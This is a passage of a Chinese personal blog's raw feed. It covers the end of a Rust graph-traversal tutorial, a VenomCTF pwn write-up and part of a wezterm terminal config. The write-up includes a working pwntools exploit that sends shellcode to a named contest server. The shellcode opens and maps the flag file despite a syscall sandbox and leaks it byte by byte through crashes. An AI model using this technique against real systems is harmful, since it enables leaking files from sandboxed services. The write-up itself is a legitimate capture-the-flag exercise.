punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> spanning_tree <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    queue<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 0-based 索引</span>    visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换回 1-based 索引</span>        <span class="token comment">// 遍历所有邻居</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> neighbor <span class="token operator">=</span> node_ptr<span class="token punctuation">.</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>neighbor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>                spanning_tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> neighbor <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            current <span class="token operator">=</span> <span class="token operator">&amp;</span>node_ptr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>result<span class="token punctuation">,</span>spanning_tree<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_bfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> edges<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> g <span class="token operator">=</span> <span class="token class-name">Graph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    g<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>edges<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> bfs_result <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">bfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>bfs_result<span class="token number">.0</span><span class="token punctuation">,</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> expected_edges <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>bfs_result<span class="token number">.1</span><span class="token punctuation">,</span> expected_edges<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现"><a href="#借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现" class="headerlink" title="借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现"></a>借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现</h2><p>没想到什么优雅地记录生成树的办法，只能使用额外的空间记录每个节点的父节点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"> <span class="token keyword">fn</span> <span class="token function-definition function">dfs_aio</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> visited <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> result <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> spanning_tree <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> parent <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token class-name">None</span><span class="token punctuation">;</span> <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 0-based 索引</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换回 1-based 索引</span>        <span class="token comment">// 记录生成树边（如果不是起始节点）</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>parent_node<span class="token punctuation">)</span> <span class="token operator">=</span> parent<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>            spanning_tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token punctuation">(</span>parent_node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 将邻居按逆序压入栈中</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> neighbors <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> neighbor <span class="token operator">=</span> node_ptr<span class="token punctuation">.</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>neighbor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                neighbors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 记录父节点关系</span>                parent<span class="token punctuation">[</span>neighbor<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            current <span class="token operator">=</span> <span class="token operator">&amp;</span>node_ptr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 逆序压入栈</span>        <span class="token keyword">for</span> neighbor <span class="token keyword">in</span> neighbors<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">*</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>result<span class="token punctuation">,</span> spanning_tree<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="实现有向图的遍历操作"><a href="#实现有向图的遍历操作" class="headerlink" title="实现有向图的遍历操作"></a>实现有向图的遍历操作</h2><p>以上均适配有向图操作</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;实现一个邻接表&quot;&gt;&lt;a href=&quot;#实现一个邻接表&quot; class=&quot;headerlink&quot; title=&quot;实现一个邻接表&quot;&gt;&lt;/a&gt;实现一个邻接表&lt;/h2&gt;&lt;p&gt;基本结构，一个链表头结点vec代指每个顶点&lt;br&gt;&lt;pre class=&quot;line-numbers</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>VenomCTF WP</title>
    <link href="https://aucept.in/2025/11/15/VenomCTF-WP/"/>
    <id>https://aucept.in/2025/11/15/VenomCTF-WP/</id>
    <published>2025-11-15T11:57:27.340Z</published>
    <updated>2025-11-18T03:57:22.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="good-night"><a href="#good-night" class="headerlink" title="good_night"></a>good_night</h2><p>初看朝阳东升，不解题中意，再看四野寂寂，已成题中人</p><p>指早八看到这道题晚八还没解出来，good night</p><p>程序有栈溢出，反复地读然后复制到会越界的地方，约等于一个多一字节溢出，可以把返回地址改成<code>leave ret</code></p><p>然后给了一个bss段读，可以进行布置，开始rop。</p><p>题目说预期解是ret2ld，又提示可以考虑使用ret2dl来泄漏libc地址，再提示ret2dl不单可以调用函数也可以尝试调用libc中的gadget，总结下来就是不会</p><h2 id="never"><a href="#never" class="headerlink" title="never"></a>never</h2><p>一个沙盒环境，禁了execve、read、write及部分变体，然后给了一个固定的页并执行</p><p>考虑ORW，open没有禁，read可以用mmap映射完成读，但是w缺失，考虑用一些状态间接反应</p><p>调试时发现程序段错误会有输出，启动脚本会报错，所以经过设计，逐字节mmap 当前目录下的flag文件，然后和指定字符比较，如果一致转去执行一个触发段错误的指令，不一致则exit，无报错输出</p><p>然后爆破：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>HOST <span class="token operator">=</span> <span class="token string">'47.98.117.93'</span>PORT <span class="token operator">=</span> <span class="token number">53698</span><span class="token keyword">def</span> <span class="token function">test_char</span><span class="token punctuation">(</span>position<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> test_value<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""测试指定位置的字符是否等于test_value"""</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"测试: flag[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">] == </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string"> ('</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>test_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">')?"</span></span><span class="token punctuation">)</span>        s <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ideas!"</span><span class="token punctuation">)</span>        shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''        mov r14, 0xDEADB800        mov dword ptr [r14], 0x67616c66                mov r15, 0xDEADB100        mov byte ptr [r15], 0x0f        mov byte ptr [r15+1], 0x05        mov byte ptr [r15+2], 0xc3                mov rdi, 0xDEADB800        xor rsi, rsi        mov rax, 2        call r15        mov r12, rax                xor rdi, rdi        mov rsi, 100        mov rdx, 1        mov r10, 2        mov r8, r12        xor r9, r9        mov rax, 9        call r15                mov rbx, rax        add rbx, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">        mov dl, byte ptr [rbx]        mov cl, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string">        cmp dl, cl        je crash                xor rdi, rdi        mov rax, 60        call r15                crash:        mov rax, 0xdeadbeef        mov rbx, qword ptr [rax]    '''</span></span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'\x90'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    test_char<span class="token punctuation">(</span>?<span class="token punctuation">,</span>?<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h2><p>除了一个栈溢出似乎什么也没有</p><p>提示需要用到两个magic gadget</p><p>找了半天只找到一个<code>add DWORD PTR [rbp-0x3d],ebx</code>，不会用</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>坏消息是只解出一道题</p><p>好消息是pwn的三道题除了这道never都是0解，magic甚至官方没放wp（打算明年接着用……</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;good-night&quot;&gt;&lt;a href=&quot;#good-night&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
    <category term="orw" scheme="https://aucept.in/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>wezterm配置</title>
    <link href="https://aucept.in/2025/11/12/wezterm%E9%85%8D%E7%BD%AE/"/>
    <id>https://aucept.in/2025/11/12/wezterm%E9%85%8D%E7%BD%AE/</id>
    <published>2025-11-12T10:52:50.000Z</published>
    <updated>2025-11-18T04:00:26.377Z</updated>
    
    <content type="html"><![CDATA[<p>每天看着暗红色的终端喜新厌旧了，感觉流离用的fish命令提示功能，还有在别人博客上经常看到的暗蓝色的都好酷，正如本文的分类，家要有家的样子，遂重新配置我的终端！</p><p>为什么选wezterm呢？因为它用rust实现，用lua写配置文件——因为喜欢</p><p><a href="https://wezterm.org/install/linux.html">官方安装文档</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>需要在~下创建一个配置文件.wezterm.lua，windows在%USERPROFILE%下</p><p>嗯，用lua做配置文件，也就意味着配置参数里可以塞很多复杂的逻辑，极其灵活，赞</p><p>贴一下我的：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> wezterm <span class="token operator">=</span> require <span class="token string">'wezterm'</span><span class="token keyword">local</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">-- 基础设置</span>config<span class="token punctuation">.</span>enable_tab_bar <span class="token operator">=</span> <span class="token keyword">true</span>config<span class="token punctuation">.</span>hide_tab_bar_if_only_one_tab <span class="token operator">=</span> <span class="token keyword">true</span>config<span class="token punctuation">.</span>use_fancy_tab_bar <span class="token operator">=</span> <span class="token keyword">true</span>  <span class="token comment">-- false 为简洁样式</span>config<span class="token punctuation">.</span>tab_bar_at_bottom <span class="token operator">=</span> <span class="token keyword">false</span>  <span class="token comment">-- true 将标签栏放底部</span>config<span class="token punctuation">.</span>tab_max_width <span class="token operator">=</span> <span class="token number">25</span><span class="token comment">-- 启动设置 (Windows)</span>config<span class="token punctuation">.</span>default_prog <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'wsl.exe'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'Ubuntu'</span><span class="token punctuation">,</span> <span class="token string">'--cd'</span><span class="token punctuation">,</span> <span class="token string">'/home/auceptin_fang'</span><span class="token punctuation">,</span><span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'fish'</span> <span class="token punctuation">&#125;</span><span class="token comment">-- 字体设置</span>config<span class="token punctuation">.</span>font <span class="token operator">=</span> wezterm<span class="token punctuation">.</span><span class="token function">font_with_fallback</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token string">'Cascadia Code'</span><span class="token punctuation">,</span>  <span class="token comment">-- Windows 自带</span>  <span class="token string">'Consolas'</span><span class="token punctuation">,</span>       <span class="token comment">-- Windows 自带</span>  <span class="token string">'Courier New'</span><span class="token punctuation">,</span>    <span class="token comment">-- Windows 自带</span>  <span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span>  <span class="token string">'SimSun'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>config<span class="token punctuation">.</span>font_size <span class="token operator">=</span> <span class="token number">14.0</span>config<span class="token punctuation">.</span>line_height <span class="token operator">=</span> <span class="token number">1.2</span>  <span class="token comment">-- 行高倍数</span>config<span class="token punctuation">.</span>cell_width <span class="token operator">=</span> <span class="token number">1.0</span>   <span class="token comment">-- 字符宽度倍数</span><span class="token comment">-- 字体特性（连字等）</span>config<span class="token punctuation">.</span>harfbuzz_features <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'calt=1'</span><span class="token punctuation">,</span> <span class="token string">'clig=1'</span><span class="token punctuation">,</span> <span class="token string">'liga=1'</span> <span class="token punctuation">&#125;</span><span class="token comment">-- 性能配置</span>config<span class="token punctuation">.</span>front_end <span class="token operator">=</span> <span class="token string">"WebGpu"</span> config<span class="token punctuation">.</span>max_fps <span class="token operator">=</span> <span class="token number">60</span>config<span class="token punctuation">.</span>animation_fps <span class="token operator">=</span> <span class="token number">60</span>config<span class="token punctuation">.</span>enable_kitty_graphics <span class="token operator">=</span> <span class="token keyword">false</span><span class="token comment">-- 配色方案</span>config<span class="token punctuation">.</span>color_scheme <span class="token operator">=</span> <span class="token string">"Tokyo Night"</span><span class="token comment">-- config.color_scheme = 'Batman'</span><span class="token comment">-- config.color_scheme = "Catppuccin Mocha"</span><span class="token comment">-- config.color_scheme = "Dracula"</span><span class="token comment">-- config.color_scheme = "Nord"</span><span class="token comment">-- config.color_scheme = "Gruvbox Dark"</span><span class="token comment">-- config.color_scheme = "One Dark"</span><span class="token comment">-- config.color_scheme = "Solarized Dark"</span><span class="token comment">--[[ 自定义颜色config.colors = &#123;  foreground = '#c0caf5',  background = '#1a1b26',  cursor_bg = '#c0caf5',  cursor_border = '#c0caf5',  cursor_fg = '#1a1b26',  selection_bg = '#33467C',  selection_fg = '#c0caf5',&#125;]]</span><span class="token comment">-- 背景透明度</span>config<span class="token punctuation">.</span>window_background_opacity <span class="token operator">=</span> <span class="token number">0.94</span>  <span class="token comment">-- 如果要使用背景图片，取消注释下面几行：</span><span class="token comment">-- config.window_background_image = 'C:/'</span><span class="token comment">-- config.window_background_image_hsb = &#123;</span><span class="token comment">--   brightness = 0.3,  -- 建议 0.3-0.5</span><span class="token comment">--   hue = 1.0,</span><span class="token comment">--   saturation = 1.0,</span><span class="token comment">-- &#125;</span><span class="token comment">-- 如果要透明效果，设置 0.85-0.95：</span><span class="token comment">-- config.window_background_opacity = 0.92</span><span class="token comment">-- 光标设置</span>config<span class="token punctuation">.</span>default_cursor_style <span class="token operator">=</span> <span class="token string">'BlinkingBlock'</span> <span class="token comment">-- 闪烁</span>config<span class="token punctuation">.</span>cursor_blink_rate <span class="token operator">=</span> <span class="token number">500</span>config<span class="token punctuation">.</span>cursor_blink_ease_in <span class="token operator">=</span> <span class="token string">'Ease'</span>  <span class="token comment">-- 淡入效果：'Constant', 'Linear', 'Ease', 'EaseIn', 'EaseOut', 'EaseInOut'</span>config<span class="token punctuation">.</span>cursor_blink_ease_out <span class="token operator">=</span> <span class="token string">'Constant'</span>  <span class="token comment">-- 淡出效果</span><span class="token comment">-- 窗口设置</span>config<span class="token punctuation">.</span>window_decorations <span class="token operator">=</span> <span class="token string">"RESIZE"</span>config<span class="token punctuation">.</span>window_padding <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  left <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>  right <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>  top <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  bottom <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>config<span class="token punctuation">.</span>initial_cols <span class="token operator">=</span> <span class="token number">120</span>config<span class="token punctuation">.</span>initial_rows <span class="token operator">=</span> <span class="token number">30</span>config<span class="token punctuation">.</span>window_close_confirmation <span class="token operator">=</span> <span class="token string">'NeverPrompt'</span><span class="token comment">-- 滚动设置</span>config<span class="token punctuation">.</span>scrollback_lines <span class="token operator">=</span> <span class="token number">10000</span>config<span class="token punctuation">.</span>enable_scroll_bar <span class="token operator">=</span> <span class="token keyword">true</span><span class="token comment">-- 快捷键</span>config<span class="token punctuation">.</span>keys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">-- 字体大小调整</span>  <span class="token punctuation">&#123;</span> key <span class="token operator">=</span> <span class="token string">'+'</span><span class="token punctuation">,</span> mods <span class="token operator">=</span> <span class="token string">'CTRL'</span><span class="token punctuation">,</span> action <span class="token operator">=</span> wezterm<span class="token punctuation">.</span>action<span class="token punctuation">.</span>IncreaseFontSize <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  